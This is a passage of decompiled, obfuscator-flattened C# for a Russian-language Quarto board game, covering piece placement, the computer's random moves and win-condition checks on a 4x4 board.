				{
					int num14;
					if (!(Form1.smethod_41((Control)(object)borderBox[num8, num5]) == Color.Blue))
					{
						num = 1108799450;
						num14 = 1108799450;
					}
					else
					{
						num = 1672828244;
						num14 = 1672828244;
					}
					continue;
				}
				case 12u:
					num10 = Form1.smethod_39(e) / size;
					num = (int)((num2 * 2042243937) ^ 0x4B44417E);
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -956240934) ^ -1215386880;
					continue;
				case 10u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1796039513) ^ 0x4F907CF7;
						continue;
					}
					num11 = 0;
					goto IL_01e2;
				case 9u:
					num8++;
					num = ((int)num2 * -2045314842) ^ -1590220480;
					continue;
				case 8u:
					num9 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -372880006) ^ 0x1E775563;
					continue;
				case 7u:
					num = ((int)num2 * -1041172291) ^ 0x3B296FE;
					continue;
				case 6u:
					num11 = ((board[num10, num9] == null) ? 1 : 0);
					goto IL_01e2;
				case 5u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1658124103) ^ -1602829126;
					continue;
				case 4u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num5]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1698941209) ^ -821027668;
					continue;
				case 2u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = -575683036;
						num7 = -575683036;
					}
					else
					{
						num6 = -1183734500;
						num7 = -1183734500;
					}
					num = num6 ^ ((int)num2 * -833634258);
					continue;
				}
				case 1u:
					num5 = 0;
					num = 574027944;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 660671769;
						num4 = 660671769;
					}
					else
					{
						num3 = 370879569;
						num4 = 370879569;
					}
					num = num3 ^ (int)(num2 * 1622808884);
					continue;
				}
				default:
					return;
				case 3u:
					break;
				case 20u:
					return;
					IL_01e2:
					flag = (byte)num11 != 0;
					num = 204084326;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e2: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num16 = default(int);
		int num18 = default(int);
		int num12 = default(int);
		int num23 = default(int);
		int num24 = default(int);
		int num44 = default(int);
		int num47 = default(int);
		int num28 = default(int);
		int num29 = default(int);
		int num43 = default(int);
		bool flag5 = default(bool);
		int num19 = default(int);
		int num10 = default(int);
		int num13 = default(int);
		int num8 = default(int);
		int num31 = default(int);
		int num32 = default(int);
		int num9 = default(int);
		Graphics graphics_ = default(Graphics);
		int num11 = default(int);
		bool flag8 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		Figurine[,] array2 = default(Figurine[,]);
		int num27 = default(int);
		Figurine[,] array = default(Figurine[,]);
		int num5 = default(int);
		bool flag12 = default(bool);
		int num57 = default(int);
		bool flag2 = default(bool);
		bool flag10 = default(bool);
		bool flag7 = default(bool);
		bool flag6 = default(bool);
		bool flag11 = default(bool);
		bool flag9 = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 533748934;
			while (true)
			{
				uint num2;
				int num53;
				int num36;
				int num33;
				int num34;
				switch ((num2 = (uint)num ^ 0x70995114u) % 161u)
				{
				case 160u:
				{
					int num17;
					if (num16 >= 4)
					{
						num = 1953056915;
						num17 = 1953056915;
					}
					else
					{
						num = 2062750380;
						num17 = 2062750380;
					}
					continue;
				}
				case 158u:
					num = (int)((num2 * 490715896) ^ 0x81699C0);
					continue;
				case 157u:
					num18++;
					num = 593492869;
					continue;
				case 156u:
					num = ((int)num2 * -2143354517) ^ -1136650094;
					continue;
				case 155u:
					num12++;
					num = ((int)num2 * -334394340) ^ -1137775214;
					continue;
				case 154u:
					num = 1365337847;
					continue;
				case 153u:
					board[num23, num24] = new Figurine(storage[num44, num47]);
					storage[num44, num47] = null;
					num = (int)((num2 * 865026138) ^ 0x3C41C6ED);
					continue;
				case 152u:
					Form1.smethod_5((Control)(object)borderBox[num28, num29], Color.Blue);
					Form1.smethod_30((Control)(object)borderBox[num28, num29]);
					num = ((int)num2 * -1262598833) ^ -109544915;
					continue;
				case 151u:
					num = (int)(num2 * 1756823174) ^ -1955473176;
					continue;
				case 150u:
					num = (int)((num2 * 1968946772) ^ 0x1443C545);
					continue;
				case 149u:
					num = 1193147165;
					continue;
				case 148u:
					num43 = 0;
					num = ((int)num2 * -1967359334) ^ -1444485677;
					continue;
				case 147u:
				{
					int num62;
					int num63;
					if (flag5)
					{
						num62 = 634230100;
						num63 = 634230100;
					}
					else
					{
						num62 = 2020703963;
						num63 = 2020703963;
					}
					num = num62 ^ ((int)num2 * -1322319632);
					continue;
				}
				case 146u:
					num = ((int)num2 * -641044805) ^ -1817008141;
					continue;
				case 145u:
					Paint_Board();
					num = ((int)num2 * -30266127) ^ 0x7ADB983B;
					continue;
				case 144u:
				{
					int num56;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num16 * size + size / 2, (int)(((float)num19 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = 1839546372;
						num56 = 1839546372;
					}
					else
					{
						num = 505161617;
						num56 = 505161617;
					}
					continue;
				}
				case 143u:
					num10 = 0;
					num = 646769655;
					continue;
				case 142u:
					Form1.smethod_5((Control)(object)borderBox[num12, num13], Color.LimeGreen);
					Form1.smethod_30((Control)(object)borderBox[num12, num13]);
					num = ((int)num2 * -1276216754) ^ -1230253275;
					continue;
				case 141u:
					if (num28 == num8)
					{
						num = ((int)num2 * -464282816) ^ 0x3F65767F;
						continue;
					}
					num53 = 0;
					goto IL_027d;
				case 140u:
					num = ((int)num2 * -1916799239) ^ -1152384925;
					continue;
				case 139u:
					Form1.smethod_7((Control)(object)pictureBox[num12, num13], bool_0: false);
					num = 1466336798;
					continue;
				case 138u:
					num31 = Form1.smethod_33(rnd, 4);
					num32 = Form1.smethod_33(rnd, 4);
					num = 1126426735;
					continue;
				case 137u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num44 = 0;
					num = (int)(num2 * 1006293376) ^ -2109675144;
					continue;
				case 136u:
					num = (int)(num2 * 82044739) ^ -594228855;
					continue;
				case 135u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = ((int)num2 * -2008024401) ^ 0x19960DDC;
					continue;
				case 134u:
				{
					int num49;
					if (num12 < 4)
					{
						num = 136848513;
						num49 = 136848513;
					}
					else
					{
						num = 1647852660;
						num49 = 1647852660;
					}
					continue;
				}
				case 133u:
					num28 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -661426103) ^ 0x571EDC9;
					continue;
				case 132u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num11 = 0;
					num = ((int)num2 * -1135582886) ^ -428625333;
					continue;
				case 131u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = (int)(num2 * 206906911) ^ -644744795;
					continue;
				case 130u:
					num = (int)((num2 * 1320049009) ^ 0x6408CD4B);
					continue;
				case 129u:
				{
					int num39;
					int num40;
					if (!flag8)
					{
						num39 = -66949596;
						num40 = -66949596;
					}
					else
					{
						num39 = -1569195947;
						num40 = -1569195947;
					}
					num = num39 ^ ((int)num2 * -311320561);
					continue;
				}
				case 128u:
					num = (int)(num2 * 1622524458) ^ -1941391433;
					continue;
				case 127u:
					num36 = (Standoff(array3) ? 1 : 0);
					goto IL_0426;
				case 126u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num10 + 0.05f) * (float)size, ((float)num11 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1313314168) ^ -235603119;
					continue;
				case 125u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 197400466) ^ -410845827;
					continue;
				case 124u:
					num = 1940358033;
					continue;
				case 123u:
					num = ((int)num2 * -1708303720) ^ -1909035410;
					continue;
				case 122u:
					num18 = 0;
					num = 666258751;
					continue;
				case 121u:
					num = 968623747;
					continue;
				case 120u:
					array2[num27, num18] = new Figurine(storage[num28, num29]);
					num = ((int)num2 * -1978918082) ^ -484045771;
					continue;
				case 119u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 1542585239) ^ 0x505390F);
					continue;
				case 118u:
					num = (int)((num2 * 1573339257) ^ 0x3D6F21FF);
					continue;
				case 116u:
					num23 = 0;
					num24 = 0;
					num = (int)(num2 * 1698282918) ^ -575620007;
					continue;
				case 115u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 1892886917) ^ -880101508;
					continue;
				case 114u:
				{
					int num20;
					if (Form1.smethod_41((Control)(object)borderBox[num19, num16]) == Color.Blue)
					{
						num = 188150198;
						num20 = 188150198;
					}
					else
					{
						num = 887305898;
						num20 = 887305898;
					}
					continue;
				}
				case 113u:
					num = (int)((num2 * 1703232088) ^ 0x7E7F833C);
					continue;
				case 112u:
					num = (int)((num2 * 563527430) ^ 0x468E67FA);
					continue;
				case 111u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num10 * size + 4, num11 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 352475724) ^ 0xC2C19C7);
					continue;
				case 110u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1394932897) ^ 0x49DA5C0F);
					continue;
				case 109u:
					num = (int)((num2 * 405091731) ^ 0xE946FFC);
					continue;
				case 108u:
					num5 = 0;
					num = ((int)num2 * -336506559) ^ -605841005;
					continue;
				case 107u:
					num8 = num12;
					num9 = num13;
					num = ((int)num2 * -1169451504) ^ 0x2C6C968B;
					continue;
				case 106u:
				{
					int num60;
					int num61;
					if (flag12)
					{
						num60 = -776077552;
						num61 = -776077552;
					}
					else
					{
						num60 = -715652647;
						num61 = -715652647;
					}
					num = num60 ^ ((int)num2 * -482869710);
					continue;
				}
				case 105u:
					num57 = 0;
					num = 1025662189;
					continue;
				case 104u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -2078299229) ^ 0x734491C9;
					continue;
				case 103u:
					num5++;
					num = (int)(num2 * 1150271922) ^ -1905351893;
					continue;
				case 102u:
					num = (int)(num2 * 206750694) ^ -868510714;
					continue;
				case 101u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)(num2 * 458851526) ^ -1673575334;
					continue;
				case 100u:
					num = 2082200804;
					continue;
				case 99u:
					num = ((int)num2 * -1505847168) ^ 0x3E2BD711;
					continue;
				case 98u:
					num = ((int)num2 * -1293164578) ^ 0x2F581904;
					continue;
				case 97u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num32 + 0.05f) * (float)size, ((float)num31 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 2075170772) ^ 0x328F664C);
					continue;
				case 96u:
					num = ((int)num2 * -875127696) ^ -1226188915;
					continue;
				case 95u:
					Form1.smethod_30((Control)(object)pictureBox[num19, num16]);
					num = (int)((num2 * 1941026816) ^ 0x5A267EAA);
					continue;
				case 94u:
					flag2 = num57 < 4;
					num = 395852433;
					continue;
				case 93u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num32 * size + 4, num31 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -251335687) ^ 0x284E6A64;
					continue;
				case 92u:
				{
					int num58;
					int num59;
					if (flag10)
					{
						num58 = -1448301885;
						num59 = -1448301885;
					}
					else
					{
						num58 = -421717985;
						num59 = -421717985;
					}
					num = num58 ^ (int)(num2 * 666409463);
					continue;
				}
				case 91u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 2050267970) ^ -876475812;
					continue;
				case 90u:
					Form1.smethod_7((Control)(object)pictureBox[num43, num57], bool_0: true);
					num57++;
					num = 1025662189;
					continue;
				case 89u:
					num = ((int)num2 * -763875666) ^ 0x6C9AF0;
					continue;
				case 88u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = (int)(num2 * 616179975) ^ -659396739;
					continue;
				case 87u:
					board[num31, num32] = new Figurine(storage[num8, num9]);
					storage[num8, num9] = null;
					num = (int)(num2 * 752653380) ^ -1613395001;
					continue;
				case 86u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = ((int)num2 * -1756820982) ^ -1903472936;
					continue;
				case 85u:
					flag7 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -421109408) ^ -1966742912;
					continue;
				case 84u:
					array3[num11, num10] = new Figurine(storage[num8, num9]);
					if (!Stop(array3))
					{
						num = (int)(num2 * 1932024701) ^ -198469426;
						continue;
					}
					num36 = 1;
					goto IL_0426;
				case 83u:
					if (!flag6)
					{
						num = ((int)num2 * -229543369) ^ -1579202444;
						continue;
					}
					goto IL_0a92;
				case 82u:
					num16 = 0;
					num = 563825870;
					continue;
				case 81u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 2022196839) ^ -1672197497;
					continue;
				case 80u:
					num53 = ((num29 == num9) ? 1 : 0);
					goto IL_027d;
				case 79u:
					num = 1701294736;
					continue;
				case 78u:
					num16++;
					num = (int)(num2 * 518526724) ^ -326117403;
					continue;
				case 77u:
					board[num11, num10] = new Figurine(storage[num8, num9]);
					storage[num8, num9] = null;
					flag8 = Standoff(board);
					num = ((int)num2 * -928265421) ^ -612914454;
					continue;
				case 76u:
				{
					int num55;
					if (num43 >= 4)
					{
						num = 288572817;
						num55 = 288572817;
					}
					else
					{
						num = 1196356820;
						num55 = 1196356820;
					}
					continue;
				}
				case 75u:
				{
					int num54;
					if (array[num27, num18] == null)
					{
						num = 164370232;
						num54 = 164370232;
					}
					else
					{
						num = 1365337847;
						num54 = 1365337847;
					}
					continue;
				}
				case 74u:
					num = ((int)num2 * -1528933164) ^ -2001571947;
					continue;
				case 73u:
					Form1.smethod_5((Control)(object)borderBox[num19, num16], Color.White);
					num = ((int)num2 * -1925882846) ^ 0x68D3942C;
					continue;
				case 72u:
					num29 = Form1.smethod_33(rnd, 4);
					if (storage[num28, num29] != null)
					{
						num = (int)(num2 * 1138578731) ^ -1585198201;
						continue;
					}
					num53 = 1;
					goto IL_027d;
				case 71u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1903409043) ^ -303559780;
					continue;
				case 70u:
					num = ((int)num2 * -1255665878) ^ -45686901;
					continue;
				case 69u:
					num47 = num16;
					num = (int)(num2 * 641926600) ^ -567255799;
					continue;
				case 68u:
					Form1.smethod_15(timer1);
					num = 104197835;
					continue;
				case 67u:
					num = ((int)num2 * -1016099388) ^ 0x50A41B05;
					continue;
				case 66u:
					num19 = 0;
					num = (int)(num2 * 34578879) ^ -1808869482;
					continue;
				case 65u:
					num = (int)(num2 * 1696522248) ^ -1146393315;
					continue;
				case 64u:
					num = ((int)num2 * -263919785) ^ 0x548C6A;
					continue;
				case 63u:
				{
					int num52;
					if (num19 < 4)
					{
						num = 1993877813;
						num52 = 1993877813;
					}
					else
					{
						num = 1078890850;
						num52 = 1078890850;
					}
					continue;
				}
				case 62u:
					num23 = num19;
					num24 = num16;
					num = ((int)num2 * -604846936) ^ 0x77361609;
					continue;
				case 61u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = ((int)num2 * -243356539) ^ 0x3E26BB00;
					continue;
				case 60u:
				{
					int num50;
					int num51;
					if (!flag11)
					{
						num50 = 1698402938;
						num51 = 1698402938;
					}
					else
					{
						num50 = 105333774;
						num51 = 105333774;
					}
					num = num50 ^ (int)(num2 * 727492524);
					continue;
				}
				case 59u:
					flag11 = board[num31, num32] != null;
					num = ((int)num2 * -1069120550) ^ -451372895;
					continue;
				case 58u:
					num = ((int)num2 * -517064459) ^ 0x1923D437;
					continue;
				case 57u:
					num = 1523956536;
					continue;
				case 56u:
					num = ((int)num2 * -1048988493) ^ 0x24543161;
					continue;
				case 55u:
					flag6 = false;
					num = (int)((num2 * 229718258) ^ 0x2E382674);
					continue;
				case 54u:
				{
					int num48;
					if (!Standoff(board))
					{
						num = 49857713;
						num48 = 49857713;
					}
					else
					{
						num = 1893434403;
						num48 = 1893434403;
					}
					continue;
				}
				case 53u:
					num47 = 0;
					num = (int)((num2 * 1096203412) ^ 0x56CCB824);
					continue;
				case 52u:
					Form1.smethod_30((Control)(object)borderBox[num19, num16]);
					Form1.smethod_20(pictureBox[num19, num16], (Image)null);
					num = (int)(num2 * 203057294) ^ -1713487017;
					continue;
				case 51u:
					num = ((int)num2 * -845590665) ^ 0x2BC3772A;
					continue;
				case 50u:
					num13++;
					num = 1521970771;
					continue;
				case 49u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = ((int)num2 * -1686263882) ^ -648308870;
					continue;
				case 48u:
					num11++;
					num = (int)((num2 * 833088134) ^ 0x2FDEFF70);
					continue;
				case 47u:
					num = ((int)num2 * -2068205590) ^ 0x4870DBB8;
					continue;
				case 46u:
					num43++;
					num = ((int)num2 * -256661138) ^ -856227887;
					continue;
				case 45u:
					num = ((int)num2 * -1060786741) ^ 0x613A27D1;
					continue;
				case 44u:
				{
					int num45;
					int num46;
					if (flag9)
					{
						num45 = -699590601;
						num46 = -699590601;
					}
					else
					{
						num45 = -586375015;
						num46 = -586375015;
					}
					num = num45 ^ ((int)num2 * -149820224);
					continue;
				}
				case 43u:
					num44 = num19;
					num = ((int)num2 * -1564070594) ^ -1785835956;
					continue;
				case 42u:
				{
					int num41;
					int num42;
					if (flag3)
					{
						num41 = -939699129;
						num42 = -939699129;
					}
					else
					{
						num41 = -231606034;
						num42 = -231606034;
					}
					num = num41 ^ ((int)num2 * -1518536359);
					continue;
				}
				case 41u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1496401351) ^ 0x15372AB8;
					continue;
				case 40u:
					num19++;
					num = ((int)num2 * -506009273) ^ -215210220;
					continue;
				case 39u:
					num33 = ((!Standoff(board)) ? 1 : 0);
					goto IL_0fa2;
				case 38u:
					flag10 = board[num11, num10] == null;
					num = 1846156880;
					continue;
				case 37u:
					flag9 = num13 < 4;
					num = 2068387077;
					continue;
				case 36u:
					num9 = 0;
					num = (int)((num2 * 1034329022) ^ 0x143D1722);
					continue;
				case 35u:
				{
					int num37;
					int num38;
					if (!flag7)
					{
						num37 = -1991138728;
						num38 = -1991138728;
					}
					else
					{
						num37 = -1794145377;
						num38 = -1794145377;
					}
					num = num37 ^ ((int)num2 * -448256320);
					continue;
				}
				case 34u:
				{
					int num35;
					if (num27 >= 4)
					{
						num = 1048548516;
						num35 = 1048548516;
					}
					else
					{
						num = 1638341903;
						num35 = 1638341903;
					}
					continue;
				}
				case 33u:
					flag6 = true;
					num = (int)((num2 * 1177800259) ^ 0x21BA0866);
					continue;
				case 32u:
					if (num5 >= 9)
					{
						num = 993183217;
						num34 = 993183217;
						continue;
					}
					goto IL_0a92;
				case 31u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1641641842) ^ 0x9CCC505;
					continue;
				case 30u:
					flag5 = num11 < 4;
					num = 569846289;
					continue;
				case 29u:
					num = ((int)num2 * -1469415694) ^ -1613696636;
					continue;
				case 28u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)(num2 * 975197063) ^ -1638333045;
					continue;
				case 27u:
					if (!Stop(board))
					{
						num = (int)((num2 * 765445300) ^ 0x430C377E);
						continue;
					}
					num33 = 0;
					goto IL_0fa2;
				case 26u:
					num = (int)((num2 * 1085874450) ^ 0x361AC911);
					continue;
				case 25u:
					array[num31, num32] = new Figurine(storage[num8, num9]);
					num27 = 0;
					num = (int)(num2 * 603663507) ^ -1236345913;
					continue;
				case 24u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1124181462) ^ -834464097;
					continue;
				case 23u:
					num12 = 0;
					num = (int)((num2 * 296342778) ^ 0xEC054E);
					continue;
				case 22u:
					num = 997078072;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1142489675;
					continue;
				case 20u:
					num13 = 0;
					num = 1521970771;
					continue;
				case 19u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 55918742) ^ 0x7F81BE42);
					continue;
				case 18u:
				{
					int num30;
					if (num10 >= 4)
					{
						num = 1435240133;
						num30 = 1435240133;
					}
					else
					{
						num = 993595999;
						num30 = 993595999;
					}
					continue;
				}
				case 17u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 570397885) ^ 0x2AF5B49);
					continue;
				case 16u:
					num27++;
					num = ((int)num2 * -1664907054) ^ -1146671099;
					continue;
				case 15u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1767460108) ^ -626965190;
					continue;
				case 14u:
				{
					int num25;
					int num26;
					if (!flag4)
					{
						num25 = -1613292644;
						num26 = -1613292644;
					}
					else
					{
						num25 = -27427039;
						num26 = -27427039;
					}
					num = num25 ^ (int)(num2 * 1952301148);
					continue;
				}
				case 13u:
				{
					int num21;
					int num22;
					if (Stop(array2))
					{
						num21 = -1586177820;
						num22 = -1586177820;
					}
					else
					{
						num21 = -1912996588;
						num22 = -1912996588;
					}
					num = num21 ^ (int)(num2 * 1752053421);
					continue;
				}
				case 12u:
					num8 = 0;
					num = ((int)num2 * -2016235747) ^ -483147529;
					continue;
				case 11u:
					num = ((int)num2 * -1867696014) ^ -595830620;
					continue;
				case 10u:
					num = (int)(num2 * 259903041) ^ -2048314306;
					continue;
				case 9u:
					flag3 = num18 < 4;
					num = 2073773442;
					continue;
				case 8u:
					num = (int)(num2 * 356804615) ^ -1217689950;
					continue;
				case 7u:
					num = ((int)num2 * -303931330) ^ 0x37393479;
					continue;
				case 6u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					num = (int)((num2 * 1529116529) ^ 0x31E0A3EC);
					continue;
				case 5u:
					num = (int)(num2 * 365951081) ^ -727358925;
					continue;
				case 4u:
				{
					int num14;
					int num15;
					if (Form1.smethod_41((Control)(object)borderBox[num12, num13]) == Color.Red)
					{
						num14 = 1981753836;
						num15 = 1981753836;
					}
					else
					{
						num14 = 504452003;
						num15 = 504452003;
					}
					num = num14 ^ ((int)num2 * -173520239);
					continue;
				}
				case 3u:
					num = ((int)num2 * -1408661832) ^ -175107094;
					continue;
				case 2u:
					num10++;
					num = 361191043;
					continue;
				case 1u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = -1035165992;
						num7 = -1035165992;
					}
					else
					{
						num6 = -1900649839;
						num7 = -1900649839;
					}
					num = num6 ^ (int)(num2 * 1665425101);
					continue;
				}
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -274005416;
						num4 = -274005416;
					}
					else
					{
						num3 = -1353987029;
						num4 = -1353987029;
					}
					num = num3 ^ ((int)num2 * -580229551);
					continue;
				}
				default:
					return;
				case 159u:
					break;
				case 117u:
					return;
					IL_0426:
					flag = (byte)num36 != 0;
					num = 1176215382;
					continue;
					IL_0fa2:
					flag4 = (byte)num33 != 0;
					num = 115514485;
					continue;
					IL_027d:
					flag12 = (byte)num53 != 0;
					num = 1562500459;
					continue;
					IL_0a92:
					num = 1597248428;
					num34 = 1597248428;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num3 = default(int);
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1450402935;
			while (true)
			{
				uint num2;
				int num31;
				int num4;
				switch ((num2 = (uint)num ^ 0x24D3FFDBu) % 76u)
				{
				case 75u:
					num3++;
					num = 88151891;
					continue;
				case 74u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)(num2 * 670017572) ^ -1422282188;
						continue;
					}
					goto IL_0044;
				case 73u:
				{
					int num15;
					int num16;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num15 = 566621515;
						num16 = 566621515;
					}
					else
					{
						num15 = 621687404;
						num16 = 621687404;
					}
					num = num15 ^ (int)(num2 * 316658931);
					continue;
				}
				case 72u:
				{
					int num43;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = 1546133468;
						num43 = 1546133468;
					}
					else
					{
						num = 539531886;
						num43 = 539531886;
					}
					continue;
				}
				case 71u:
				{
					int num70;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = 1202540290;
						num70 = 1202540290;
					}
					else
					{
						num = 976814529;
						num70 = 976814529;
					}
					continue;
				}
				case 70u:
				{
					int num54;
					int num55;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num54 = 1814797549;
						num55 = 1814797549;
					}
					else
					{
						num54 = 1291382839;
						num55 = 1291382839;
					}
					num = num54 ^ ((int)num2 * -1298978762);
					continue;
				}
				case 69u:
				{
					int num19;
					int num20;
					if (mem[0, num3].Big != mem[1, num3].Big)
					{
						num19 = 1458360522;
						num20 = 1458360522;
					}
					else
					{
						num19 = 96286667;
						num20 = 96286667;
					}
					num = num19 ^ (int)(num2 * 540677977);
					continue;
				}
				case 68u:
					num3 = 0;
					num = (int)(num2 * 2031670850) ^ -1226244853;
					continue;
				case 67u:
				{
					int num61;
					int num62;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num61 = 944685879;
						num62 = 944685879;
					}
					else
					{
						num61 = 1496832013;
						num62 = 1496832013;
					}
					num = num61 ^ (int)(num2 * 834238806);
					continue;
				}
				case 66u:
				{
					int num58;
					int num59;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num58 = -1630441128;
						num59 = -1630441128;
					}
					else
					{
						num58 = -223817902;
						num59 = -223817902;
					}
					num = num58 ^ (int)(num2 * 1198769112);
					continue;
				}
				case 65u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 282616763;
						continue;
					}
					goto IL_0240;
				case 64u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -129627958) ^ -1631847503;
						continue;
					}
					goto IL_0275;
				case 63u:
				{
					int num25;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 326712562;
						num25 = 326712562;
					}
					else
					{
						num = 1788192160;
						num25 = 1788192160;
					}
					continue;
				}
				case 62u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -599122614) ^ -700920288;
						continue;
					}
					goto IL_02d7;
				case 61u:
					flag = true;
					num = (int)(num2 * 332992557) ^ -1655692799;
					continue;
				case 60u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1819984488) ^ -1497383520;
						continue;
					}
					goto IL_031e;
				case 59u:
				{
					int num64;
					int num65;
					if (mem[3, 3] != null)
					{
						num64 = 2027066370;
						num65 = 2027066370;
					}
					else
					{
						num64 = 2136376619;
						num65 = 2136376619;
					}
					num = num64 ^ ((int)num2 * -640525826);
					continue;
				}
				case 58u:
				{
					int num50;
					int num51;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num50 = -1972634028;
						num51 = -1972634028;
					}
					else
					{
						num50 = -2056463287;
						num51 = -2056463287;
					}
					num = num50 ^ (int)(num2 * 328410565);
					continue;
				}
				case 57u:
				{
					int num45;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 1300807441;
						num45 = 1300807441;
					}
					else
					{
						num = 1693873665;
						num45 = 1693873665;
					}
					continue;
				}
				case 56u:
				{
					int num36;
					int num37;
					if (mem[num3, 3] == null)
					{
						num36 = -20945637;
						num37 = -20945637;
					}
					else
					{
						num36 = -865760762;
						num37 = -865760762;
					}
					num = num36 ^ (int)(num2 * 1655018415);
					continue;
				}
				case 55u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -2130715049) ^ 0x44D4ACAA;
						continue;
					}
					goto IL_042a;
				case 54u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -1419248236) ^ 0x6D1C5F67;
						continue;
					}
					goto IL_044d;
				case 53u:
				{
					int num9;
					int num10;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num9 = -1700692370;
						num10 = -1700692370;
					}
					else
					{
						num9 = -1123719857;
						num10 = -1123719857;
					}
					num = num9 ^ ((int)num2 * -1736657153);
					continue;
				}
				case 52u:
				{
					int num6;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
